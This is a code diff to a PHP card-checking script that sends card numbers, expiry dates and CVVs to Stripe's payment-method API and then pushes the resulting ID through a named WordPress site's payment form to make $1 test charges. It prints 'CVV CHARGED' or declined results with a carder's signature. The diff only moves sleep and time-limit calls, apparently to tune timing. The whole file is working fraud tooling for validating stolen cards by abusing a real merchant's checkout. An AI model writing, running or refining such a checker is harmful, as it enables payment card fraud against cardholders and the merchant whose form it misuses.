@@ -60,7 +60,7 @@ function mod($dividendo,$divisor)
 
 ////////////////////////////===[1 Req]
 
-sleep(10);
+set_time_limit(0);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -91,10 +91,11 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
+sleep(10);
 
 ////////////////////////////===[2 Req]
 
-sleep(10);
+set_time_limit(0);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://marthahealthsolutions.com/wp-admin/admin-ajax.php?t=1716440395318');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -125,10 +126,11 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D405%26_fluentform_3_fluentformnonce%3D5914def0aa%26_wp_http_referer%3D%252Fpayment-proceed%252F%26names%255Bfirst_name%255D%3D%26numeric-field%3D%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26email%3D%26phone%3D%26datetime%3D23%252F05%252F2024%26custom-payment-amount%3D1%26numeric-field_1%3D%26description%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 $result2 = curl_exec($ch);
+sleep(10);
 
 ////////////////////////////===[Responses CVV]===////////////////////////////
 
-sleep(10);
+set_time_limit(0);
 if
 (strpos($result2,  'Thank you for your Payment.')) {
   echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 1$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
@@ -147,6 +149,7 @@ elseif
 else {
   echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
 }
+sleep(10);
 
 curl_close($ch);
 ob_flush();
